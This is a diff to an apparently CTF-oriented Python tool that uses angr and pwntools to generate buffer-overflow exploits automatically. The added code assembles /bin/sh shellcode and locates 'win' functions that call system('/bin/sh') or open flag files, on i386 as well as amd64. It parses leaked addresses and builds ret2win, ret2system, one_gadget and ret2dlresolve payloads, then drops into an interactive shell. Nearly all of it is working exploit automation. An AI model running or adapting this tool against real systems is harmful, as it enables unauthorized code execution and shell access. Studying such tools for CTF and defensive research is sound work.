@@ -6,7 +6,7 @@ import angr
 from angr.storage.memory_mixins.address_concretization_mixin import MultiwriteAnnotation
 
 from .my_utils import (init_r2, killmyself, set_concrete, check_r2_one, pack,
-                       unpack, get_di_register, get_sp_register)
+                       unpack, get_di_register, get_sp_register, find_hex_strings)
 
 
 class angr_gets(angr.SimProcedure):
@@ -60,7 +60,7 @@ class angr_gets(angr.SimProcedure):
             return dst
 
 class Bof_Aeg(object):
-    def __init__(self, filepath: str, elf: pwn.ELF, inputpath: str, outputpath: str, libpath: str, p, base_addr=0x555555554000):
+    def __init__(self, filepath: str, elf: pwn.ELF, inputpath: str, outputpath: str, libpath: str, p, base_addr=0x555555554000, args=None):
         self.project = angr.Project(filepath, load_options={'auto_load_libs': False}, main_opts={'base_addr': base_addr})
         self.project.hook_symbol('gets',angr_gets())
         self.cfg = self.project.analyses.CFG(normalize=True)
@@ -70,6 +70,8 @@ class Bof_Aeg(object):
         self.filepath = filepath
         self.libpath = libpath
         self.p = p
+        if args:
+            self.args = args
 
         add_options = {
             angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
@@ -89,7 +91,7 @@ class Bof_Aeg(object):
 
         self.entry_state = state.copy()
         self.setup_arch_args()
-        
+        self.sh = pwn.asm(pwn.shellcraft.sh())
         
     def setup_arch_args(self):
         if pwn.context.arch == 'amd64':
@@ -132,60 +134,108 @@ class Bof_Aeg(object):
         pwn.log.info("Finding win...")
         self.win_addr = 0
 
+        if pwn.context.arch == 'amd64':
         # Look for system("/bin/sh") or system("cat flag")
-        if 'system' in self.elf.plt:
-            system_node = self.cfg.model.get_any_node(self.elf.plt['system'])
-            if system_node:
-                for pre in system_node.predecessors:
-                    # node may be included
-                    if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
-                        continue
-                    state = self.project.factory.blank_state(
-                    addr = pre.addr,
-                    mode = 'fastpath') # we don't want to do any solving
-                    simgr = self.project.factory.simgr(state)
-                    simgr.explore(find=pre.addr+pre.size-5)
+            if 'system' in self.elf.plt:
+                system_node = self.cfg.model.get_any_node(self.elf.plt['system'])
+                if system_node:
+                    for pre in system_node.predecessors:
+                        # node may be included
+                        if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
+                            continue
+                        state = self.project.factory.blank_state(
+                        addr = pre.addr,
+                        mode = 'fastpath') # we don't want to do any solving
+                        simgr = self.project.factory.simgr(state)
+                        simgr.explore(find=pre.addr+pre.size-5)
 
-                    st = simgr.found[0]
-                    arg = st.memory.load(get_di_register(st), self.word_size) 
-                    if arg.uninitialized:
-                        break
-                    cmd = st.solver.eval(st.memory.load(get_di_register(st), self.word_size),cast_to=bytes)
-                    cmd13 = st.solver.eval(st.memory.load(get_di_register(st),13),cast_to=bytes)
-                    if cmd in (b'/bin/sh\x00',b'cat flag') or cmd13 == b'/bin/cat flag':
-                        self.win_addr = pre.addr
-                        pwn.log.info("Found system(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
+                        st = simgr.found[0]
+                        arg = st.memory.load(get_di_register(st), self.word_size) 
+                        if arg.uninitialized:
+                            break
+                        cmd = st.solver.eval(st.memory.load(get_di_register(st), self.word_size),cast_to=bytes)
+                        cmd13 = st.solver.eval(st.memory.load(get_di_register(st),13),cast_to=bytes)
+                        if cmd in (b'/bin/sh\x00',b'cat flag') or cmd13 == b'/bin/cat flag':
+                            self.win_addr = pre.addr
+                            pwn.log.info("Found system(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
+                            
                         
-                    
-        if 'fopen' in self.elf.plt:
-            fopen_node = self.cfg.model.get_any_node(self.elf.plt['fopen'])
-            if fopen_node:
-                for pre in fopen_node.predecessors:
-                    # node may be included
-                    if pre.addr <= fopen_node.addr and pre.addr + pre.size < fopen_node.addr:
-                        continue
-                    state = self.project.factory.blank_state(
-                    addr = pre.addr,
-                    mode = 'fastpath') # we don't want to do any solving
-                    simgr = self.project.factory.simgr(state)
-                    simgr.explore(find=pre.addr+pre.size-5) # find addres of fopen
-                    
-                    st = simgr.found[0]
-                    # print(st.regs.eip)
-                    
-                    # Find address of string "flag", "flag.txt"
-                    arg = st.memory.load(get_di_register(st), self.word_size) 
-                    if arg.uninitialized:
-                        break
-                    cmd = st.solver.eval(st.memory.load(get_di_register(st), self.word_size),cast_to=bytes)
-                    cmd13 = st.solver.eval(st.memory.load(get_di_register(st),13),cast_to=bytes)
-                    # print(cmd, cmd13)
+            if 'fopen' in self.elf.plt:
+                fopen_node = self.cfg.model.get_any_node(self.elf.plt['fopen'])
+                if fopen_node:
+                    for pre in fopen_node.predecessors:
+                        # node may be included
+                        if pre.addr <= fopen_node.addr and pre.addr + pre.size < fopen_node.addr:
+                            continue
+                        state = self.project.factory.blank_state(
+                        addr = pre.addr,
+                        mode = 'fastpath') # we don't want to do any solving
+                        simgr = self.project.factory.simgr(state)
+                        simgr.explore(find=pre.addr+pre.size-5) # find addres of fopen
+                        
+                        st = simgr.found[0]
+                        # print(st.regs.eip)
+                        
+                        # Find address of string "flag", "flag.txt"
+                        arg = st.memory.load(get_di_register(st), self.word_size) 
+                        if arg.uninitialized:
+                            break
+                        cmd = st.solver.eval(st.memory.load(get_di_register(st), self.word_size),cast_to=bytes)
+                        cmd13 = st.solver.eval(st.memory.load(get_di_register(st),13),cast_to=bytes)
+                        # print(cmd, cmd13)
 
-                    if cmd in (b'flag.txt',b'flag', b'/flag.txt', b'/flag'):
-                        self.win_addr = pre.addr
-                        pwn.log.info("Found fopen(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
+                        if cmd in (b'flag.txt',b'flag', b'/flag.txt', b'/flag'):
+                            self.win_addr = pre.addr
+                            pwn.log.info("Found fopen(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
                         
-                    
+        if pwn.context.arch == 'i386':
+        # i386 specific code
+            if 'system' in self.elf.plt:
+                system_node = self.cfg.model.get_any_node(self.elf.plt['system'])
+                if system_node:
+                    for pre in system_node.predecessors:
+                        # Ensure the predecessor node is valid
+                        if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
+                            continue
+
+                        state = self.project.factory.blank_state(addr=pre.addr, mode='fastpath')
+                        simgr = self.project.factory.simgr(state)
+                        simgr.explore(find=pre.addr + pre.size - 5)
+
+                        if simgr.found:
+                            st = simgr.found[0]  # State at the system call
+                            arg_addr = st.memory.load(st.regs.ebp + 8, 4)  # Address of the argument
+                            arg_str = st.solver.eval(arg_addr, cast_to=bytes)  # Retrieve the string argument
+
+                            # Check if the argument is what we are looking for
+                            if arg_str == b'/bin/sh\x00':
+                                self.win_addr = pre.addr
+                                pwn.log.info("Found system(\"/bin/sh\") win_addr :0x%x" % pre.addr)
+                                break  
+            
+            if 'fopen' in self.elf.plt:
+                fopen_node = self.cfg.model.get_any_node(self.elf.plt['fopen'])
+                if fopen_node:
+                    for pre in fopen_node.predecessors:
+                        # Ensure the predecessor node is valid
+                        if pre.addr <= fopen_node.addr and pre.addr + pre.size < fopen_node.addr:
+                            continue
+
+                        state = self.project.factory.blank_state(addr=pre.addr, mode='fastpath')
+                        simgr = self.project.factory.simgr(state)
+                        simgr.explore(find=pre.addr + pre.size - 5)
+
+                        if simgr.found:
+                            st = simgr.found[0]  # State at the system call
+                            arg_addr = st.memory.load(st.regs.esp - 0x8, 4)  # Address of the argument
+                            arg_str = st.solver.eval(arg_addr, cast_to=bytes)  # Retrieve the string argument
+
+                            # Check if the argument is what we are looking for
+                            if arg_str in (b'flag.txt',b'flag', b'/flag.txt', b'/flag'):
+                                self.win_addr = pre.addr
+                                pwn.log.info("Found system(\"/bin/sh\") win_addr :0x%x" % pre.addr)
+                                break  
+                                
         # looking for print flag to stdout
         flag_addrs = []
         flag_addrs.extend(list(self.elf.search(b'flag\x00')))
@@ -257,7 +307,10 @@ class Bof_Aeg(object):
         if (b'0x' in data or b'\x55'*3 in data): # text leak, check if 0x555555 in data or not
             if b'0x' in data:
                 aid = data.index(b'0x')
-                leak = int(data[aid:aid+14],16) # converts 6 bytes into int, include 0x
+                hex_strings = find_hex_strings(data)
+                leak = int(hex_strings[0],16) # converts 6 bytes into int, include 0x
+                if self.args.win_in_output:
+                    self.leaked_variable = leak
                 recv_str = data[:aid] # receive until address
                 recv_type = 'str'
             else:
@@ -283,12 +336,12 @@ class Bof_Aeg(object):
                         self.libc_offset = leak - debug_libc_base
                         break
 
-        if not self.has_text_leak and not self.has_libc_leak:
+        if not self.has_text_leak and not self.has_libc_leak and not self.leaked_variable:
             pwn.log.error("PIE and No leak!")
 
-        self.p.recvuntil(recv_str)
+        data = self.p.recvline()
         if recv_type == 'str':
-            leak = int(self.p.recv(14),16)
+            leak = int(find_hex_strings(data)[0],16)
         elif recv_type == 'byte':
             leak = unpack(self.p.recv(6).ljust(8,b'\x00'))
 
@@ -303,6 +356,8 @@ class Bof_Aeg(object):
             pwn.log.info("Found remote libc leak :0x%x"%leak)
             self.libc_base = leak - self.libc_offset - shift_offset
             pwn.log.info("libc_base :0x%x"%self.libc_base)
+        elif self.leaked_variable:
+            pwn.log.info("Found variable leak :0x%x"%self.leaked_variable)
         
         self.leak_recv_str = recv_str
         self.leak_recv_type = recv_type
@@ -310,16 +365,16 @@ class Bof_Aeg(object):
     def get_shell(self):
         """Select vulnerability exploitation techniques based on analysis
         """
-        if self.win_addr:
-            self.p.info("Using r2w technique")
+        if self.win_addr or self.leaked_variable:
+            self.p.info("Using ret2w2in technique")
             self.ret_to_win()
         if self.elf.pie and self.has_libc_leak: # There is a libc address leak，ret to one_gadget/system
-            self.p.info("Using r2o technique")
+            self.p.info("Using ret2one technique")
             self.ret_to_one()
-            self.p.info("Using r2s technique")
+            self.p.info("Using ret2system technique")
             self.ret_to_system()
         elif not self.ret_to_libc(): # There is no function available for leak
-            self.p.info("Using r2dl technique")
+            self.p.info("Using ret2dlresolve technique")
             self.ret_to_dlresolve()
 
     def find_matches_flag(self, data, pattern=None):
@@ -354,11 +409,25 @@ class Bof_Aeg(object):
             return
         pwn.log.info("Trying tech{ret_to_win}...")
 
-        win_addr = self.win_addr if not self.elf.pie else self.win_addr-self.elf.address+self.text_base
+        try:
+            win_addr = self.win_addr if not self.elf.pie else self.win_addr-self.elf.address+self.text_base
+        except:
+            win_addr = self.leaked_variable
         state: angr.SimState = self.vuln_state.copy()
         set_concrete(state, self.vuln_control_addrs, pack(win_addr))
         payload = b''.join(state.posix.stdin.concretize())
         
+        if pwn.context.arch == 'i386':
+            payload = b'\0'*4 + payload
+            if self.args.win_in_output:
+                idx = len(self.sh)
+                self.p = self.elf.process()
+                payload = self.sh + payload[idx:]
+                idx = payload.index(pack(self.leaked_variable))
+                payload = payload[:idx] + pack(int(find_hex_strings(self.p.recvline())[0], 16))
+                self.p.sendline(payload)
+                self.p.interactive()
+                self.p = self.elf.process()
         # system has movaps(check rsp & 0xf == 0)
 
         self.p.sendline(payload)
